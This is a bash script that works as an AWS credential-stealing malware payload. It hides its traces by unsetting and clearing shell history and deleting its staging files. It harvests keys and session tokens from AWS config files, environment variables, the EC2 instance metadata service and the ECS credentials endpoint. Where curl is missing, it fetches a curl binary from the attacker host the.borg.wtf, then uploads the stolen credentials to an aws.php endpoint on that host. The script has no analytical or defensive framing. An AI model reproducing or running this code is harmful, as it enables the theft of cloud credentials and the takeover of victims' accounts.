#!/bin/bash
unset HISTFILE
export LC_ALL=C
export PATH=$PATH:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin:/usr/games:/usr/local/games
BORG_KUBE="http://the.borg.wtf"

download() {
  read proto server path <<< "${1//"/"/ }"
  DOC=/${path// //}
  HOST=${server//:*}
  PORT=${server//*:}
  [[ x"${HOST}" == x"${PORT}" ]] && PORT=80
  exec 3<>/dev/tcp/${HOST}/$PORT
  echo -en "GET ${DOC} HTTP/1.0\r\nHost: ${HOST}\r\n\r\n" >&3
  while IFS= read -r line ; do 
      [[ "$line" == $'\r' ]] && break
  done <&3
  nul='\0'
  while IFS= read -d '' -r x || { nul=""; [ -n "$x" ]; }; do 
      printf "%s$nul" "$x"
  done <&3
  exec 3>&-
}

chattr -ia / /var/ /var/tmp/ 2>/dev/null
if ! [ -d "/dev/shm/.../...BORG.../" ] ; then mkdir -p /dev/shm/.../...BORG.../ 2>/dev/null ; fi

if type aws 2>/dev/null 1>/dev/null; then aws configure list >> /dev/shm/.../...BORG.../AWS_data.txt ; fi

env | grep 'AWS\|aws' >> /dev/shm/.../...BORG.../AWS_data.txt

cat /root/.aws/* >> /dev/shm/.../...BORG.../AWS_data.txt
cat /home/*/.aws/* >> /dev/shm/.../...BORG.../AWS_data.txt


# http://169.254.169.254/latest/meta-data/iam/info
# grep 'InstanceProfileId\|InstanceProfileArn'


download http://169.254.169.254/latest/meta-data/iam/security-credentials/ > /dev/shm/.../...BORG.../iam.role
iam_role_name=$(cat /dev/shm/.../...BORG.../iam.role)
rm -f /dev/shm/.../...BORG.../iam.role 2>/dev/null
download http://169.254.169.254/latest/meta-data/iam/security-credentials/${iam_role_name} > /dev/shm/.../...BORG.../aws.tmp.key
cat /dev/shm/.../...BORG.../aws.tmp.key >> /dev/shm/.../...BORG.../AWS_data.txt
rm -f /dev/shm/.../...BORG.../aws.tmp.key

if ! [ -z "$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI" ] ; then download http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI > /var/tmp/...b.asces
cat /var/tmp/...b.asces | python -m json.tool >> /dev/shm/.../...BORG.../AWS_data.txt ; rm -f /var/tmp/...b.asces ; fi

cat /dev/shm/.../...BORG.../AWS_data.txt | grep 'access_key\|secret_key\|region\|aws_access_key_id\|aws_secret_access_key\|LastUpdated\|AccessKeyId\|SecretAccessKey\|Token\|Expiration' >> /dev/shm/.../...BORG.../AWS_Key.txt
rm -f /dev/shm/.../...BORG.../AWS_data.txt 2>/dev/null
find /dev/shm/.../...BORG.../ -size 0 -exec rm {} \; 2>/dev/null

if [ -f "/dev/shm/.../...BORG.../AWS_Key.txt" ] ; then
if ! type curl 2>/dev/null 1>/dev/null; then download http://the.borg.wtf/outgoing/binary_files/system/curl > /dev/shm/.../...BORG.../curl
chmod +x /dev/shm/.../...BORG.../curl ; /dev/shm/.../...BORG.../curl -F "userfile=@/dev/shm/.../...BORG.../AWS_Key.txt" "http://the.borg.wtf/incoming/access_data/aws.php"
else curl -F "userfile=@/dev/shm/.../...BORG.../AWS_Key.txt" "http://the.borg.wtf/incoming/access_data/aws.php" ; fi
cat /dev/shm/.../...BORG.../AWS_Key.txt | grep 'access_key\|secret_key\|region\|aws_access_key_id\|aws_secret_access_key\|LastUpdated\|AccessKeyId\|SecretAccessKey\|Expiration'
rm -f /dev/shm/.../...BORG.../AWS_Key.txt 2>/dev/null ; fi
rm -f /tmp/.ax 2>/dev/null
rm -f /tmp/.ay 2>/dev/null
history -c
